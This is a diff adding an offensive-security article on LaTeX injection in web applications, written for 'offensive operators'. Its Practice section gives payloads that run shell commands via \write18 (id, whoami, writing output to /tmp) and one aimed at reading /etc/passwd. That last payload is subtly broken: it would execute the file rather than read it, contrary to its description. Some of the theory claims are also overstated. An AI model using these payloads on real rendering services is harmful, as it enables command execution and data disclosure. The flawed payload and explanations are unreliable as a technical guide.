@@ -1,0 +1,89 @@
+---
+title: Advanced LaTeX Injection Techniques
+description: Explore advanced LaTeX injection techniques, focusing on macro manipulation,
+  token expansion, and execution flow for cybersecurity.
+keywords:
+- LaTeX injection
+- macro manipulation
+- token expansion
+- execution flow
+- catcode manipulation
+- dynamic command creation
+- cybersecurity exploits
+- web application security
+- advanced injection techniques
+---
+
+# Advanced Techniques
+
+## Context
+
+This article explores advanced methods for exploiting LaTeX injection vulnerabilities in web applications. It targets offensive operators who understand LaTeX syntax, web application structures, and basic LaTeX injection techniques. The objective is to harness LaTeX's capabilities to redefine macros, manipulate tokens, and exploit execution flow for broader impacts in a compromised system.
+
+## Theory
+
+### Macro Manipulation and Redefinition
+
+The LaTeX commands `\let` and `\def` are instrumental in redefining existing or introducing new commands during document processing. By exploiting these, an attacker can alter document logic, circumventing security controls or chaining payloads to introduce harmful behavior. Typically, an attacker will inject `\let` or `\def` to repurpose safe commands with malicious intentions. For instance, redefining a standard LaTeX section command could introduce unauthorized content into generated documents.
+
+### Catcode and Token Expansion Abuse
+
+Catcodes govern how LaTeX interprets each particular character, such as whether it is viewed as text, a command, or special syntax. Manipulating these catcodes within an application could open pathways to inject forbidden characters or traverse input filters designed to block unsafe input. In practice, attackers might manipulate these codes to coerce LaTeX into treating dangerous sequences as executable code, facilitating secondary payload execution.
+
+### Advanced Token Expansion and Execution Flow
+
+LaTeX's `\aftergroup` and `\futurelet` commands allow the deferring of token expansion and execution. This ability means that attackers can delay payload execution until conditions are more favorable, such as avoiding static analysis or triggering after initial page rendering. By employing these techniques, an injected payload might remain quiescent until it is safely past detection systems.
+
+### Dynamic Command Creation and Disclosure
+
+Commands like `\meaning` and `\string` in LaTeX can disclose existing command definitions and create new ones dynamically. This capability allows an attacker to uncover internal macros or sensitive application logic. Exploiting these methods might involve using `\meaning` to leak information inadvertently stored in macros, or employing `\string` to convert commands into strings that reveal internal application logic to the attacker.
+
+## Practice
+
+### Macro Redefinition via \let
+
+- **Payload:**
+  ```latex
+  \let\oldsection\section\def\section#1{Malicious Section: #1\oldsection{#1}}
+  ```
+  This payload redefines the `\section` command to prepend "Malicious Section:" to each section title before the original section logic is executed. This injection affects document structure and potentially misleads or alarms end-users.
+
+### Catcode Manipulation for Filter Bypass
+
+- **Payload:**
+  ```latex
+  \catcode`\@=11 \def\evil@cmd{\input|/etc/passwd|}
+  ```
+  Here, we alter the category code of `@` to make it a letter, allowing for the unobstructed creation of new macros such as `\evil@cmd`, which here attempts to inject a path leading to `/etc/passwd`. This technique bypasses certain input validation strategies.
+
+### Token Expansion Delay with \aftergroup
+
+- **Payload:**
+  ```latex
+  \def\evil{\immediate\write18{id}}\aftergroup\evil
+  ```
+  The execution of the `\evil` command, designed to run an immediate shell command, is delayed using `\aftergroup`. This delay subverts standard filters and deferred validation methods by activating the payload after intended checks.
+
+### Dynamic Macro Disclosure with \meaning
+
+- **Payload:**
+  ```latex
+  \immediate\write18{echo \meaning\section > /tmp/section.txt}
+  ```
+  Extracting and saving the definition of a macro like `\section` facilitates offline analysis, further examination, and adaptation of attacks based on disclosed logic.
+
+### Dynamic Command Creation with \csname
+
+- **Payload:**
+  ```latex
+  \expandafter\def\csname evilcmd\endcsname{\immediate\write18{whoami}}\evilcmd
+  ```
+  This process dynamically constructs a macro named `evilcmd` that immediately executes the command `whoami`, illustrating command execution capability through dynamically named constructs.
+
+## Tools
+
+- **TeXLive**
+- **pdflatex**
+- **lualatex**
+
+These tools facilitate the creation, manipulation, and execution of LaTeX documents, providing a versatile environment for attackers to test and deploy their exploitation strategies.
